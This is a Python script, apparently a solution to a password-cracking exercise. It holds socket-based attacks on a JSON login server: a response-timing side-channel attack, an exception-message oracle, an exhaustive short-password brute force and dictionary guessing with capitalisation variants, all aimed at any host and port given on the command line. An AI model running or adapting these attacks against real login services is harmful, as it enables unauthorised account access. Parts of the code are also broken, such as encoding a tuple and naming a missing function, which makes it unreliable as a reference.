from socket import socket
from sys import argv
from itertools import product
from string import digits
from string import ascii_lowercase
from string import ascii_letters
from os import getcwd
import json
from time import perf_counter


pwd_dictionary_path = getcwd() + '\\password_dictionary.txt'
login_dictionary_path = getcwd() + '\\logins.txt'


def replace_index(string, sub, index):
    return string[:index] + sub + string[index + 1:]


def socket_call_JSON(client, message):
    client.send(json.dumps(message).encode())
    response = json.loads(client.recv(1024))
    return response


def socket_call(client, message):
    client.send(message.encode())
    response = client.recv(256)
    return response


def time_vulnerability_exploit(host, port):
    """script that monitors time responses from host while generating passwords
    When the server takes longer than usual to respond assume letters in password are found
    """
    login_data = dict()
    responses = {
        "bad_login": "Wrong login!",
        "bad_pwd": "Wrong password!",
        "bad_req": "Bad request!",
        "connected": "Connection success!"
    }
    times = {}
    with socket() as client, open(login_dictionary_path, 'r') as file:
        let_dig = ''.join((ascii_letters, digits))
        client.connect((host, int(port)))
        for name in file:  # for loop to get login name
            login_data["login"] = name.rstrip('\n')
            login_data["password"] = ''
            response = socket_call_JSON(client, login_data)
            if response['result'] == responses['bad_pwd']:
                break
        while True:
            for char in let_dig:
                pwd = login_data.get('password') + char
                login_data['password'] = pwd
                start = perf_counter()
                response = socket_call_JSON(client, login_data)
                end = perf_counter()
                times[char] = end - start
                if response['result'] == responses['connected']:
                    break
                login_data['password'] = pwd.removesuffix(char)
            if response['result'] == responses['connected']:
                break
            else:
                login_data['password'] += max(times, key=times.get)
    print(json.dumps(login_data))


def exception_exploit(host, port):
    """ script that tries to find the admin login using common login names
    and then gets the password by exploiting the exception received by matching letters in password
     """
    login_data = dict()
    responses = {
        "bad_login": "Wrong login!",
        "bad_pwd": "Wrong password!",
        "bad_req": "Bad request!",
        "except_log": "Exception happened during login",
        "connected": "Connection success!"
    }
    with socket() as client, open(login_dictionary_path, 'r') as file:
        let_dig = ''.join((ascii_letters, digits))
        client.connect((host, int(port)))
        for name in file:  # for loop to get login name
            login_data["login"] = name.rstrip('\n')
            login_data["password"] = ''
            response = socket_call_JSON(client, login_data)
            if response['result'] == responses['bad_pwd']:
                break
        while response['result'] != responses['connected']:
            for char in let_dig:
                pwd = login_data.get('password') + char
                login_data['password'] = pwd
                response = socket_call_JSON(client, login_data)
                if response['result'] == responses['connected']:
                    break
                elif response['result'] != responses['except_log']:
                    login_data['password'] = pwd.removesuffix(char)
                else:
                    break
    print(json.dumps(login_data))


def brute_force_pwd(host, port):
    """ script that tries to brute force short passwords """
    letters_n_digits = ascii_lowercase + digits
    message = list(letters_n_digits)
    att = 0
    with socket() as client:
        client.connect((host, int(port)))
        i = 1
        while att < 999999:
            for x in product(message, repeat=i):
                if att == 999999:
                    break
                att += 1
                response = socket_call(client, x)
                if response.decode('utf-8') == 'Connection success!':
                    print(x)
                    break
            i += 1


def smart_brute_pwd(host, port):  # ToDo trim the digit positions from password generator
    """ brute force passwords using common passwords dictionaries """
    with socket() as client, open(pwd_dictionary_path, 'r') as file:
        client.connect((host, int(port)))
        pwd = [line.rstrip('\n') for line in file]
        for pwd_try in pwd:
            length = len(pwd_try)
            for pos_byte in range(0, 2 ** length):
                pos_bit = 0
                changed_str = pwd_try
                while (2**pos_bit) <= pos_byte:
                    if changed_str[pos_bit] not in digits:
                        if pos_byte & 2 ** pos_bit:
                            changed_str = replace_index(changed_str, changed_str[pos_bit].upper(), pos_bit)
                    pos_bit += 1
                response = socket_call(client, changed_str)
                if response.decode('utf-8') == 'Connection success!':
                    return changed_str
    return 'Failed!'


def main():
    host, port = argv[1:]
    # brute_force(host, port)  # rough brute force
    # print(smart_brute_pwd(host, port))  # brute force with dictionaries
    # exception_exploit(host, port)  # exception exploit hacking
    time_vulnerability_exploit(host, port)


if __name__ == '__main__':
    main()
